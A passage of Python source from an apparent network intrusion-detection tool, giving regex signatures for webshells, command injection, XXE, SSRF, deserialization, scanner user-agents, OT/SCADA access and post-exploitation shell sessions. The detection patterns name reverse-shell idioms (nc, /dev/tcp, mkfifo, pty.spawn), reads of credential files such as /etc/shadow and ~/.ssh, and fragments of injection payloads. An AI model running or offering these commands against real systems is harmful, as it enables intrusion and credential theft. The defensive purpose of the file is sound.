            r"powershell.*-encodedcommand", r"powershell.*-ep\s+bypass",
            r"wscript\.exe", r"cscript\.exe", r"mshta\.exe",
            r"regsvr32\.exe", r"rundll32\.exe", r"certutil\.exe",
            r"bitsadmin\.exe", r"wmic\.exe", r"schtasks\.exe",
            # Windows recon

            r"ipconfig\s*/all",
            r"qwinsta", r"query\s+user", r"whoami\s+/all",
            # Registry access
            r"reg\s+add", r"reg\s+query", r"reg\s+delete", r"reg\s+save",
            # Linux/Unix shells
            r"/bin/bash", r"/bin/sh", r"bash\s+-c",
            # More Unix shells
            r"/bin/zsh", r"/bin/ksh", r"/bin/dash", r"/bin/csh",
            r"/usr/bin/python", r"python\s+-c", r"python3\s+-c",
            r"perl\s+-e", r"ruby\s+-e", r"php\s+-r",
            # Unix recon
            r"id\s*[;&|]", r"uname\s+-a",
            r"cat\s+/etc/passwd", r"cat\s+/etc/shadow", r"cat\s+/etc/hosts",
            r"cat\s+/proc/", r"cat\s+~/.ssh", r"cat\s+~/.bash_history",
            # Network commands
            r"ip\s+addr", r"ip\s+route", r"netstat\s+-",
            r"lsof\s+-i", r"iptables\s+-L",
            # File operations
            r"find\s+/", r"ls\s+-la", r"ls\s+-R",
            # Download commands
            r"wget\s+http", r"curl\s+http", r"fetch\s+http",
            r"lwp-download", r"aria2c\s+",
            # Reverse shells
            r"nc\s+-", r"ncat\s+-",
            r"/dev/tcp/", r"mkfifo\s+", r"mknod\s+",
            # Word-bounded command indicators (plain words like 'more', 'less', 'cat' removed: they occur in normal text)
            '\\bnet\\s+(?:user|localgroup|group|view|share|use)\\b',
            '\\bwhoami\\b',
            '\\btasklist\\b',
            '\\bsysteminfo\\b',
            '\\bifconfig\\b',
            '\\bhostname\\b(?=\\s*(?:$|[;&|`)]))',
            '\\bss\\s+-[a-z]*[tlnp]',
            '\\bsh\\s+-c\\b',
            '\\btelnet\\s+\\d',
            '\\bsocat\\s+',
            '\\baxel\\s+',
        ],
        "severity": "CRITICAL",
        "mitre": ["T1059.001", "T1059.003", "T1059.004"],
        "desc": "Webshell command execution",
    },

    # =========================================================================
    # WEBSHELL JSP
    # =========================================================================
    "WEBSHELL_JSP": {
        "patterns": [
            # Basic JSP execution
            r"Runtime\.getRuntime\(\)\.exec",
            r"ProcessBuilder", r"\.getInputStream\(\)",
            r"jsp.*shell", r"<%.*Runtime.*exec.*%>",
            r"request\.getParameter.*exec",
            # Advanced JSP patterns
            r"java\.lang\.Runtime", r"java\.lang\.ProcessBuilder",
            r"java\.io\.InputStream", r"java\.io\.BufferedReader",
            r"\.exec\s*\(\s*request", r"\.exec\s*\(\s*new\s+String",
            # JSP file operations
            r"FileOutputStream", r"FileWriter", r"PrintWriter",
            r"Files\.write", r"Files\.copy",
            # JSP network operations
            r"Socket\s*\(", r"ServerSocket\s*\(", r"URL\.openStream",
            r"HttpURLConnection", r"URLConnection\.connect",
            # Reflection abuse
            r"Class\.forName", r"\.getDeclaredMethod", r"\.invoke\s*\(",
            # JSP scriptlet indicators
            r"<%@\s*page", r"<%=.*%>", r"<%!.*%>", r"<jsp:",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059"],
        "desc": "JSP Webshell detected",
    },

    # =========================================================================
    # WEBSHELL ASPX
    # =========================================================================
    "WEBSHELL_ASPX": {
        "patterns": [
            # Basic ASPX execution
            r"Process\.Start", r"ProcessStartInfo",
            r"System\.Diagnostics\.Process",
            r"cmd\.exe.*aspx", r"powershell.*aspx",
            r"Response\.Write.*Process",
            # Advanced ASPX patterns
            r"System\.Diagnostics\.ProcessStartInfo",
            r"\.StartInfo\.FileName", r"\.StartInfo\.Arguments",
            r"\.StandardOutput\.ReadToEnd", r"\.StandardError\.ReadToEnd",
            # ASPX file operations
            r"File\.WriteAllText", r"File\.AppendAllText",
            r"StreamWriter", r"BinaryWriter",
            # ASPX network operations
            r"WebClient", r"HttpWebRequest", r"TcpClient",
            r"\.DownloadString", r"\.DownloadFile",
            # Reflection abuse
            r"Assembly\.Load", r"Type\.GetType", r"Activator\.CreateInstance",
            r"MethodInfo\.Invoke", r"\.InvokeMember",
            # ASPX scriptlet
            r"<%@\s*Page", r"<%=.*%>", r"<script\s+runat=\"server\">",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059"],
        "desc": "ASPX Webshell detected",
    },

    # =========================================================================
    # FILE UPLOAD
    # =========================================================================
    "FILE_UPLOAD_DANGER": {
        "methods": ("POST", "PUT", "PATCH"),  # uploads only; a GET of /index.php is not an upload
        "patterns": [
            # Dangerous extensions
            r"upload.*\.php", r"upload.*\.jsp", r"upload.*\.aspx", r"upload.*\.asp",
            r"upload.*\.phtml", r"upload.*\.php[3-7]", r"upload.*\.phar",
            # More dangerous extensions
            r"upload.*\.py", r"upload.*\.pl", r"upload.*\.cgi",
            r"upload.*\.exe", r"upload.*\.dll", r"upload.*\.so",
            r"upload.*\.sh", r"upload.*\.bash", r"upload.*\.bat", r"upload.*\.cmd",
            r"upload.*\.vbs", r"upload.*\.vbe", r"upload.*\.ws", r"upload.*\.wsf",
            r"upload.*\.jar", r"upload.*\.war", r"upload.*\.ear",
            # Content-Type abuse
            r"Content-Type:\s*application/x-php",
            r"Content-Type:\s*application/x-httpd-php",
            r"Content-Type:\s*application/x-jsp",
            r"Content-Type:\s*application/octet-stream",
            # Filename patterns
            r"Content-Disposition:.*filename.*\.php", r"Content-Disposition:.*filename.*\.jsp",
            r"Content-Disposition:.*filename.*\.aspx", r"Content-Disposition:.*filename.*\.exe",
            r"Content-Disposition:.*filename.*\.elf", r"Content-Disposition:.*filename.*\.sh",
            # Double extension
            r"\.jpg\.php", r"\.png\.php", r"\.gif\.php", r"\.jpeg\.aspx",
            r"\.pdf\.exe", r"\.doc\.exe", r"\.txt\.php",
            r"\.docx\.jsp", r"\.xlsx\.aspx", r"\.zip\.php",
            # Triple extension
            r"\.[a-z]{3,4}\.[a-z]{3,4}\.(php|jsp|aspx|exe|sh)",
            # Case manipulation
            # Space/dot tricks
            r"\.php\s+", r"\.php\.", r"\.jsp\s+", r"\.asp\.",
            # Alternate extensions
            r"\.phps", r"\.php5", r"\.pht", r"\.phtml",
            r"\.jspx", r"\.jsw", r"\.jsv",
            r"\.asa", r"\.cer", r"\.ashx", r"\.asmx",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1105"],
        "desc": "Dangerous file upload",
    },

    "FILE_UPLOAD_BINARY": {
        "patterns": [
            # ELF binary
            r"\\x7fELF", r"%7fELF", r"\x7fELF",
            # PE/Windows binary
            r"MZ.*This program", r"MZ\x90\x00",
            # Null byte injection
            r"%00\.jpg", r"%00\.png", r"%00\.gif", r"%00\.pdf",
            r"\.php%00", r"\.jsp%00", r"\.asp%00", r"\.aspx%00",
            r"\x00\.jpg", r"\x00\.png",
            # More binary signatures
            r"\x4d\x5a", r"\x50\x4b\x03\x04",  # ZIP
            r"\x1f\x8b\x08",  # GZIP
            r"\x42\x5a\x68",  # BZIP2
            r"\x52\x61\x72\x21",  # RAR
            r"\xca\xfe\xba\xbe",  # Java class
            r"\xfe\xed\xfa",  # Mach-O
            # Suspicious content in upload
            r"multipart.*MZ", r"multipart.*ELF",
            r"multipart.*PK\x03\x04",
            # Polyglot files (valid image + executable)
            r"JFIF.*MZ", r"PNG.*ELF", r"GIF89a.*<?php",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1105", "T1027"],
        "desc": "Disguised binary upload",
    },

    # =========================================================================
    # OBFUSCATION
    # =========================================================================
    "OBFUSCATION_BASE64": {
        "patterns": [
            # Base64 functions
            r"base64_decode\s*\(", r"atob\s*\(", r"Buffer\.from.*base64",
            r"Convert\.FromBase64String",
            # Chained base64
            r"base64_decode\s*\(\s*base64_decode",
            # Long base64 strings
            r"[A-Za-z0-9+/=]{100,}",
            # PHP base64 + eval
            r"eval\s*\(\s*base64_decode", r"assert\s*\(\s*base64_decode",
            # More base64 patterns
            r"system\s*\(\s*base64_decode", r"exec\s*\(\s*base64_decode",
            r"passthru\s*\(\s*base64_decode", r"shell_exec\s*\(\s*base64_decode",
            # Base64 in variables
            r"\$[a-zA-Z_]+\s*=\s*base64_decode",
            # Triple+ base64
            r"base64_decode\s*\(\s*base64_decode\s*\(\s*base64_decode",
            # Base64 with gzip
            r"base64_decode.*gzinflate", r"gzinflate.*base64_decode",
            # Base64 URL-safe
            r"base64_decode\s*\(\s*strtr", r"strtr.*base64_decode",
            # JSP/Java base64
            r"Base64\.decode", r"Base64\.getDecoder",
            # .NET base64
            r"FromBase64String\s*\(.*Encoding",
            # Python base64
            r"base64\.b64decode", r"base64\.decodebytes",
            # JavaScript base64
            r"atob\s*\(", r"btoa\s*\(",
        ],
        "severity": "HIGH",
        "mitre": ["T1027", "T1140"],
        "desc": "Obfuscation Base64",
    },

    "OBFUSCATION_ENCODING": {
        "patterns": [
            # Hex encoding
            r"\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}",
            r"0x[0-9a-fA-F]+\s*,\s*0x[0-9a-fA-F]+",
            r"chr\s*\(\s*0x[0-9a-fA-F]+\s*\)",
            # URL encoding
            r"%[0-9a-fA-F]{2}%[0-9a-fA-F]{2}%[0-9a-fA-F]{2}%[0-9a-fA-F]{2}",
            # Gzip
            r"gzinflate\s*\(", r"gzuncompress\s*\(", r"gzdecode\s*\(",
            r"zlib_decode\s*\(", r"str_rot13\s*\(",
            # Unicode
            r"\\u[0-9a-fA-F]{4}\\u[0-9a-fA-F]{4}",
            # More encoding patterns
            # Hex2bin
            r"hex2bin\s*\(", r"pack\s*\(\s*[\"']H\*[\"']",
            # UUencode
            r"convert_uudecode\s*\(", r"convert_uuencode\s*\(",
            # Quoted-printable
            r"quoted_printable_decode\s*\(",
            # ROT13
            r"str_rot13\s*\(.*eval", r"str_rot13\s*\(.*assert",
            # CharCode obfuscation
            r"String\.fromCharCode\s*\(", r"eval\s*\(.*fromCharCode",
            # Octal encoding
            r"\\[0-7]{3}\\[0-7]{3}\\[0-7]{3}",
            # HTML entities
            r"&#x[0-9a-fA-F]+;.*&#x[0-9a-fA-F]+;",
            r"&#\d+;.*&#\d+;.*&#\d+;",
            # Double encoding
            r"%25[0-9a-fA-F]{2}", r"\\x25[0-9a-fA-F]{2}",
            # Binary to text
            r"bin2hex\s*\(", r"base_convert\s*\(",
        ],
        "severity": "HIGH",
        "mitre": ["T1027", "T1140"],
        "desc": "Obfuscation Encoding",
    },

    "OBFUSCATION_EVAL_CHAIN": {
        "patterns": [
            # Variable functions
            r"\$[a-zA-Z_]+\s*\(\s*\$[a-zA-Z_]+\s*\)",
            r"\$\{.*\}\s*\(", r"\$_[A-Z]+\s*\[.*\]\s*\(",
            # Eval with variable
            r"eval\s*\(\s*\$", r"assert\s*\(\s*\$",
            # String concatenation
            r"chr\s*\(\d+\)\s*\.\s*chr\s*\(\d+\)",
            r"implode.*array_map.*chr",
            # Multi-layer eval
            r"eval\s*\(\s*str_replace", r"eval\s*\(\s*preg_replace",
            r"eval\s*\(\s*gzinflate", r"eval\s*\(\s*gzuncompress",
            # Advanced eval chains
            # Nested eval
            r"eval\s*\(.*eval\s*\(", r"assert\s*\(.*assert\s*\(",
            # Variable variables
            r"\$\$[a-zA-Z_]+", r"\$\{\$[a-zA-Z_]+\}",
            # Dynamic function calls
            r"\$[a-zA-Z_]+\s*=\s*['\"]eval['\"]", r"\$[a-zA-Z_]+\s*=\s*['\"]assert['\"]",
            r"\$[a-zA-Z_]+\s*=\s*['\"]system['\"]", r"\$[a-zA-Z_]+\s*=\s*['\"]exec['\"]",
            # Preg_replace /e modifier (deprecated but still used)
            r"preg_replace\s*\(.*\/[a-z]*e[a-z]*['\"]",
            # Create_function abuse
            r"create_function\s*\(.*eval", r"create_function\s*\(.*assert",
            # Array callback obfuscation
            r"array_map\s*\(.*\$", r"array_filter\s*\(.*\$",
            r"array_reduce\s*\(.*\$", r"array_walk\s*\(.*\$",
            # Callback functions
            r"call_user_func\s*\(.*\$", r"call_user_func_array\s*\(.*\$",
            r"register_shutdown_function\s*\(.*\$",
            # String manipulation obfuscation
            r"strrev\s*\(.*eval", r"substr\s*\(.*eval",
            r"str_replace\s*\(.*eval", r"str_rot13\s*\(.*eval",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1027", "T1059.004"],
        "desc": "Obfuscation Eval Chain",
    },

    # =========================================================================
    # HEADER ANOMALY
    # =========================================================================
    "HEADER_ANOMALY": {
        "patterns": [
            r"Content-Type:.*text/plain.*<?php",
            r"User-Agent:\s*$", r"User-Agent:\s*-\s*$",
            r"Mozilla/4\.0.*compatible.*Win32",
            r"User-Agent:.*Python-urllib", r"User-Agent:.*curl/",
            r"X-Forwarded-For:.*127\.0\.0\.1",
            r"X-Forwarded-For:.*localhost",
            # Host header injection (encoded CR/LF inside the Host value)
            'Host:[^\\r\\n]*(%0d|%0a)',
        ],
        "severity": "MEDIUM",
        "mitre": ["T1071.001"],
        "desc": "Anomalous HTTP header",
    },

    "SUSPICIOUS_USER_AGENT": {
        "patterns": [
            r"sqlmap", r"nikto", r"nmap", r"masscan", r"dirbuster", r"gobuster", r"wpscan",
            r"burpsuite", r"hydra", r"metasploit", r"cobalt", r"havij", r"acunetix",
            # More attack tools
            r"nessus", r"openvas", r"nexpose", r"qualys", r"rapid7",
            r"netsparker", r"appscan", r"w3af", r"skipfish", r"arachni",
            r"zap", r"owasp", r"paros", r"webscarab",
            r"commix", r"xsser", r"beef", r"sqlninja",
            r"pangolin", r"havij", r"darkjumper",
            # Recon tools
            r"shodan", r"censys", r"masscan", r"zmap",
            # Fuzzing tools
            r"ffuf", r"wfuzz", r"dirb", r"dirsearch",
            # Exploitation frameworks
            r"empire", r"covenant", r"sliver", r"koadic",
            # Automated scanners
            r"nuclei", r"jaeles", r"gospider",
        ],
        "severity": "MEDIUM",
        "mitre": ["T1595"],
        "desc": "Attack tool User-Agent",
    },

    # =========================================================================
    # COMPREHENSIVE HTTP SCANNER DETECTION
    # =========================================================================
    "HTTP_SCANNER_DETECTION": {
        "patterns": [
            # ===== User-Agent Fingerprinting =====
            # Network scanners
            r"(?i)nmap\s*NSE", r"(?i)masscan", r"(?i)zmap",
            r"(?i)unicornscan", r"(?i)hping",
            # Vulnerability scanners
            r"(?i)nessus", r"(?i)openvas", r"(?i)nexpose",
            r"(?i)qualys", r"(?i)rapid7", r"(?i)acunetix",
            r"(?i)netsparker", r"(?i)appscan", r"(?i)burp\s*suite",
            r"(?i)w3af", r"(?i)skipfish", r"(?i)arachni",
            r"(?i)nikto", r"(?i)wapiti",
            # Web application scanners
            r"(?i)sqlmap", r"(?i)havij", r"(?i)pangolin",
            r"(?i)dirbuster", r"(?i)gobuster", r"(?i)dirb",
            r"(?i)wpscan", r"(?i)joomscan", r"(?i)droopescan",
            r"(?i)nuclei", r"(?i)jaeles", r"(?i)gospider",
            # Fuzzing tools
            r"(?i)ffuf", r"(?i)wfuzz", r"(?i)dirsearch",
            r"(?i)feroxbuster", r"(?i)rustbuster",
            # Exploitation frameworks
            r"(?i)metasploit", r"(?i)cobalt\s*strike",
            r"(?i)covenant", r"(?i)sliver", r"(?i)koadic",
            r"(?i)xsser", r"(?i)commix",
            # Reconnaissance tools
            r"(?i)shodan", r"(?i)censys", r"(?i)fofa",
            r"(?i)theHarvester", r"(?i)recon-ng", r"(?i)amass",
            r"(?i)subfinder", r"(?i)assetfinder",
            # Proxy/Interceptor tools
            r"(?i)owasp", r"(?i)paros",
            r"(?i)webscarab", r"(?i)charles\s*proxy",
            r"(?i)fiddler", r"(?i)mitmproxy",
            # Scripting/Automation indicators
            r"(?i)python-requests", r"(?i)python-urllib",
            r"(?i)curl/", r"(?i)wget/", r"(?i)libwww-perl",
            r"(?i)go-http-client",
            r"(?i)scrapy",
            # ===== HTTP Header Patterns =====
            # Missing or unusual User-Agent
            r"User-Agent:\s*$", r"User-Agent:\s*-\s*$",
            r"User-Agent:\s*\.\s*$",
            # Scanner-specific headers
            r"X-Scanner:", r"X-Scan:", r"X-Forwarded-Scanner:",
            r"Acunetix-Product:", r"Acunetix-Scanning-agreement:",
            r"Nikto-", r"OWASP-", r"Nessus-",
            # Unusual Accept headers (scanners often don't set proper Accept)
            # Only */*, nothing else
            # ===== Request Pattern Detection =====
            # Rapid sequential requests to different URIs
            # (This pattern is for payload detection, not behavioral - behavioral in analyzer.py)
            # Known scanner payloads in URI
            r"/\.git/", r"/\.svn/", r"/\.env", r"/\.aws/",
            r"/phpinfo\.php", r"/test\.php", r"/info\.php",
            r"/shell\.php", r"/webshell", r"/c99", r"/r57",
            # Scanning for specific vulnerabilities
            r"wp-admin", r"wp-login", # WordPress
            # Joomla
            # Drupal
            # Server-side tech probing
            # Directory traversal attempts
            r"\.\./\.\./", r"%2e%2e/", r"%252e%252e",
            # SQLi/XSS probing patterns
            r"<script>", r"javascript:",
            r"UNION.*SELECT",
            # Short tool names need word boundaries ("zap"/"empire" occur in normal words)
            '(?i)\\bzap\\b',
            '(?i)\\bbeef\\b',
            '(?i)\\bvega\\b',
            '(?i)\\bempire\\b',
            '(?i)\\bburp\\b',
        ],
        "severity": "MEDIUM",  # Scanning alone is MEDIUM, exploitation is higher
        "mitre": ["T1595", "T1590"],  # Active Scanning, Gather Victim Network Info
        "desc": "Network and web application scanning tool detected",
    },

    # =========================================================================
    # ADVANCED SCANNER BEHAVIORAL PATTERNS
    # =========================================================================
    "SCANNER_BEHAVIORAL_INDICATORS": {
        "patterns": [
            # Response code fishing (scanner tries to enumerate)
            r"404.*404.*404",  # Multiple 404s in short time

            # Technology fingerprinting
            r"Server:\s*Apache", r"Server:\s*nginx", r"Server:\s*IIS",
            r"X-Powered-By:", r"X-AspNet-Version:",

            # Error message enumeration
            r"SQL syntax", r"mysql_fetch", r"ORA-\d+",
            r"Warning:", r"Fatal error:", r"Notice:",

            # Rate-limiting bypass attempts
            r"X-Forwarded-For:\s*127\.0\.0\.1",
            r"X-Originating-IP:", r"X-Remote-IP:",

            # Authentication bypass attempts
            r"admin.*'--", r"admin.*'#", r"1'or'1'='1",
        ],
        "severity": "HIGH",
        "mitre": ["T1595"],
        "desc": "Automated scanning behavior",
    },

    "COMMAND_INJECTION": {
        "patterns": [
            # Shellshock (CVE-2014-6271) function-definition prefix, usually in headers
            r"\(\)\s*\{\s*:?;?\s*\}\s*;",
            # Basic injection
            r";\s*cat\s", r"\|\s*cat\s", r";\s*ls\s", r";\s*wget\s", r";\s*curl\s", r"`.*`",
            r";\s*id\s*;", r"\|\s*id\s*\|", r";\s*whoami", r"\$\(.*\)", r"&&\s*cat\s",
            # More injection patterns
            # Command separators

            # Backtick execution
            r"`[^`]+`", r"\\x60.*\\x60",
            # Subshell
            r"\$\([^\)]+\)", r"\$\{[^\}]+\}",
            # Piping
            r"\|\s*sh", r"\|\s*bash", r"\|\s*/bin/sh",
            # Redirection
            # Time-based blind
            r";\s*sleep\s+\d+", r"\|\s*sleep\s+\d+",
            r"&&\s*sleep\s+\d+", r"\$\(sleep\s+\d+\)",
            # File reading
            r";\s*cat\s+/etc/", r"\|\s*cat\s+/etc/",
            # Network operations
            r";\s*nc\s+-", r";\s*telnet\s+", r";\s*ping\s+-c",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1059"],
        "desc": "Command Injection",
    },

    # =========================================================================
    # XXE INJECTION
    # =========================================================================
    "XXE_INJECTION": {
        "patterns": [
            # Basic XXE
            r"<!ENTITY", r"<!DOCTYPE.*ENTITY",
            r"<!ENTITY.*SYSTEM", r"<!ENTITY.*file://",
            # External entity
            r"SYSTEM\s+[\"']file://", r"SYSTEM\s+[\"']http://",
            r"SYSTEM\s+[\"']ftp://", r"SYSTEM\s+[\"']php://",
            # Parameter entities
            r"<!ENTITY\s+%", r"%[a-zA-Z_]+;",
            # XXE payloads
            r"file:///etc/passwd", r"file:///etc/shadow",
            r"file:///c:/windows/", r"file:///c:/boot.ini",
            # PHP wrappers
            r"php://filter", r"php://input", r"php://fd",
            r"expect://", r"data://",
            # OOB XXE
            r"<!ENTITY.*http://.*dtd", r"<!ENTITY.*ftp://.*dtd",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190"],
        "desc": "XXE Injection",
    },

    # =========================================================================
    # SSRF
    # =========================================================================
    "SSRF_ATTACK": {
        "targets": ("uri", "body"),  # evaluated only on URL-like parameter values
        "patterns": [
            # Internal IPs
            r"127\.0\.0\.1", r"localhost", r"0\.0\.0\.0",
            r"192\.168\.", r"10\.", r"172\.(1[6-9]|2[0-9]|3[0-1])\.",
            # IPv6 localhost
            r"::1", r"0000:0000:0000:0000:0000:0000:0000:0001",
            # Cloud metadata
            r"169\.254\.169\.254", r"metadata\.google",
            r"metadata\.azure", r"metadata\.aws",
            # Internal domains
            r"\.local", r"\.internal", r"\.corp",
            # URL schemes
            r"file://", r"gopher://", r"dict://",
            r"ftp://localhost", r"http://localhost",
            # URL bypass
            r"@127\.0\.0\.1", r"@localhost",
            r"127\.0\.0\.1@", r"localhost@",
            # Encoded IPs
            r"0x7f\.0x0\.0x0\.0x1", r"2130706433",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190"],
        "desc": "SSRF Attack",
    },

    # =========================================================================
    # TEMPLATE INJECTION
    # =========================================================================
    "TEMPLATE_INJECTION": {
        "patterns": [
            # Jinja2/Flask
            r"\{\{.*\}\}", r"\{%.*%\}",
            r"\{\{.*config.*\}\}", r"\{\{.*self.*\}\}",
            r"\{\{.*request.*\}\}", r"\{\{.*__class__.*\}\}",
            # Twig
            r"\{\{.*_self.*\}\}", r"\{\{.*dump\(.*\}\}",
            # Freemarker
            r"<#.*>", r"\$\{.*\}",
            # Velocity
            r"#set", r"#foreach", r"\$\{.*\}",
            # Smarty
            r"\{php\}", r"\{literal\}",
            # ERB (Ruby)
            r"<%=.*%>", r"<%.*%>",
            # Tornado
            r"\{\{.*\}\}", r"\{%.*%\}",
            # Pug/Jade
            r"#\{.*\}", r"!\{.*\}",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190"],
        "desc": "Template Injection",
    },

    # =========================================================================
    # DESERIALIZATION
    # =========================================================================
    "DESERIALIZATION": {
        "patterns": [
            # PHP serialization
            r"O:\d+:", r"a:\d+:\{", r"s:\d+:",
            r"unserialize\s*\(", r"serialize\s*\(",
            # Java serialization
            r"rO0AB", r"aced0005", r"\xac\xed\x00\x05",
            r"ObjectInputStream", r"readObject\s*\(",
            # Python pickle
            r"cPickle", r"pickle\.loads", r"__reduce__",
            # .NET serialization
            r"BinaryFormatter", r"SoapFormatter",
            r"Deserialize\s*\(", r"TypeNameHandling",
            # JSON deserialization
            r"\$type", r"__type", r"@type",
            # YAML deserialization
            r"!!python/", r"!!java/", r"!!ruby/",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190", "T1055"],
        "desc": "Insecure Deserialization",
    },

    # =========================================================================
    # CRLF INJECTION
    # =========================================================================
    "CRLF_INJECTION": {
        "patterns": [
            # CRLF characters
            r"%0d%0a", r"%0a%0d",
            r"\\r\\n", r"\\n\\r",
            # Header injection
            r"%0d%0aSet-Cookie:", r"%0d%0aLocation:",
            r"\r\nSet-Cookie:", r"\r\nLocation:",
            # Response splitting
            r"%0d%0a%0d%0a",
            # URL encoded
            r"%0D%0A", r"%0A%0D",
        ],
        "severity": "HIGH",
        "mitre": ["T1190"],
        "desc": "CRLF Injection",
    },


    # =========================================================================
    # OT-SPECIFIC WEB ATTACKS
    # =========================================================================
    "OT_HMI_ACCESS": {
        "targets": ("uri",),  # do not alert on Referer headers
        "patterns": [
            # Common HMI/SCADA paths
            r"/scada/", r"/hmi/", r"/wonderware/", r"/ignition/",
            r"/factorytalk/", r"/wincc/", r"/citect/", r"/genesis/",
            # Engineering tools
            r"/tia-portal/", r"/step7/", r"/rslogix/", r"/unity/",
            # Historian access
            r"/historian/", r"/pi-server/", r"/osisoft/",
            # OPC paths
            r"/opc/", r"/opcda/", r"/opcua/",
        ],
        "severity": "HIGH",
        "mitre": ["T0818", "T0819"],
        "desc": "HMI/SCADA interface access",
    },

    "OT_CONFIG_FILE_ACCESS": {
        "patterns": [
            # PLC config files
            r"\.s7p", r"\.ld5", r"\.rss", r"\.acd", r"\.mer",
            r"\.xef", r"\.zef", r"\.gsd", r"\.eds",
            # SCADA config
            r"\.scada", r"\.tagdb", r"\.historian",
            # Network config
            r"ot-network\.xml", r"plc-config\.xml",
        ],
        "severity": "CRITICAL",
        "mitre": ["T0811", "T0843"],
        "desc": "OT configuration file access",
    },

    "OT_PROTOCOL_INJECTION": {
        "patterns": [
            # Protocol commands in HTTP
            r"modbus://", r"s7://", r"dnp3://",
            r"enip://", r"bacnet://",
            # Embedded protocol data
            r"\\x00\\x00\\x00\\x06", # Modbus header
            r"\\x03\\x00", # S7 header
        ],
        "severity": "CRITICAL",
        "mitre": ["T0855", "T0831"],
        "desc": "OT protocol injection over HTTP",
    },
    # =========================================================================
    # LDAP INJECTION
    # =========================================================================
    "LDAP_INJECTION": {
        "patterns": [
            # LDAP operators
            r"\*\)\(", r"\)\(\*", r"\(\|",
            r"\(&", r"\(\!", r"=\*",
            # Filter injection
            r"\*\)\(\|", r"\)\(\|\(", r"\*\)\(&",
            # Attribute injection
            r"cn=\*", r"uid=\*", r"ou=\*",
        ],
        "severity": "HIGH",
        "mitre": ["T1190"],
        "desc": "LDAP Injection",
    },

    # =========================================================================
    # NOSQL INJECTION
    # =========================================================================
    "NOSQL_INJECTION": {
        "patterns": [
            # MongoDB
            r"\$ne", r"\$gt", r"\$lt", r"\$regex",
            r"\$where", r"\$or", r"\$and",
            r"'\s*\$ne\s*:", r"{\s*\$ne\s*:",
            # JavaScript injection in NoSQL
            r"function\s*\(\s*\)", r"return\s+true",
            # Sleep/delay injection
            r"sleep\s*\(\s*\d+\s*\)", r"benchmark",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190"],
        "desc": "NoSQL Injection",
    },

    # =========================================================================
    # OPEN REDIRECT
    # =========================================================================
    "OPEN_REDIRECT": {
        "patterns": [
            # URL parameters
            r"url=http", r"redirect=http", r"next=http",
            r"goto=http", r"return=http", r"continue=http",
            # Protocol-relative
            r"url=//", r"redirect=//",
            # Encoded URLs
            r"url=%2f%2f", r"redirect=%2f%2f",
            # JavaScript redirect
            r"javascript:.*location", r"javascript:.*window\.location",
        ],
        "severity": "MEDIUM",
        "mitre": ["T1189"],
        "desc": "Open Redirect",
    },

    # =========================================================================
    # SENSITIVE DATA EXPOSURE
    # =========================================================================
    "SENSITIVE_DATA_EXPOSURE": {
        "patterns": [
            # Configuration files
            r"\.env", r"config\.php", r"config\.json",
            r"settings\.py", r"web\.config", r"application\.properties",
            # Database files
            r"\.sql", r"\.db", r"\.sqlite", r"\.mdb",
            # Backup files
            r"\.bak", r"\.backup", r"\.old", r"\.orig",
            r"~$", r"\.swp", r"\.swo",
            # Source control
            r"\.git/", r"\.svn/", r"\.hg/", r"\.bzr/",
            # IDE files
            r"\.idea/", r"\.vscode/",
            # Log files
            r"error_log", r"access_log",
            # Keys and certificates
            r"\.key", r"\.pem", r"\.crt", r"\.cer",
            r"id_rsa", r"id_dsa", r"\.ppk",
            # Credentials patterns
            r"password\s*=", r"passwd\s*=", r"pwd\s*=",
            r"api_key\s*=", r"apikey\s*=", r"secret\s*=",
            # Only when the requested file itself ends with these extensions
            '\\.log(?:$|[?#])',
            '\\.copy(?:$|[?#])',
        ],
        "severity": "HIGH",
        "mitre": ["T1552.001", "T1213"],
        "desc": "Sensitive Data Exposure",
    },
}

# =========================================================================
# POST-EXPLOITATION / ACTIVE INTRUSION DETECTION
# Patterns for detecting attacker activity in TCP streams (reverse shells,
# webshell sessions, credential theft, privilege escalation, etc.)
# =========================================================================
POST_EXPLOITATION_PATTERNS: Dict[str, Dict[str, Any]] = {
    # --- Shell Session Detection ---
    "SHELL_SESSION": {
        "patterns": [
            # Shell prompt patterns (user@host:path$ or #)
            rb"(?<!\w)\w+@\w+:[^\r\n]*[\$#]\s",
            # id command output
            rb"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
            # PTY spawn (reverse shell stabilization)
            rb"python[23]?\s+-c\s+['\"]import\s+(pty|os)",
            rb"pty\.spawn\s*\(\s*['\"]/(bin|usr)",
            # Interactive shell upgrade
            rb"export\s+TERM=xterm",
            rb"export\s+SHELL=/(bin|usr)",
            rb"stty\s+raw\s+-echo",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1059.004", "T1071.001"],  # Unix Shell, Web Protocols
        "desc": "Interactive shell session detected (reverse shell / webshell)",
    },

    # --- Credential Theft / Exposure ---
    "CREDENTIAL_EXPOSURE": {
        "patterns": [
            # /etc/shadow content (password hashes)
            rb"(?<!\w)\w+:\$[156]\$[^\s:]+:[0-9]+:",
            # SSH credentials in cleartext
            rb"sshd\[\d+\]:\s*Accepted\s+password\s+for\s+\w+\s+from",
            # Password comments in scripts/files
            rb"#\s*pass(?:word|wd)?\s*[:=]\s*\S+",
            # su with password context
            rb"su\s+\w+\s*\n.*Password:",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1003", "T1552.001"],  # OS Credential Dumping, Credentials in Files
        "desc": "Credential / password exposure detected in TCP stream",
    },

    # --- Sensitive File Access ---
    "SENSITIVE_FILE_READ": {
        "patterns": [
            # /etc/passwd content (not just the command, but actual file content)
            rb"root:x:0:0:root:/root:",
            rb"www-data:x:33:33:",
            # /etc/shadow access
            rb"cat\s+/etc/shadow",
            rb"cat\s+/etc/passwd",
            # Configuration files
            rb"cat\s+.*configuration\.php",
            rb"cat\s+.*wp-config\.php",
            rb"cat\s+.*\.env",
            rb"cat\s+.*config\.(php|py|js|yml|yaml|json|ini|xml)",
        ],
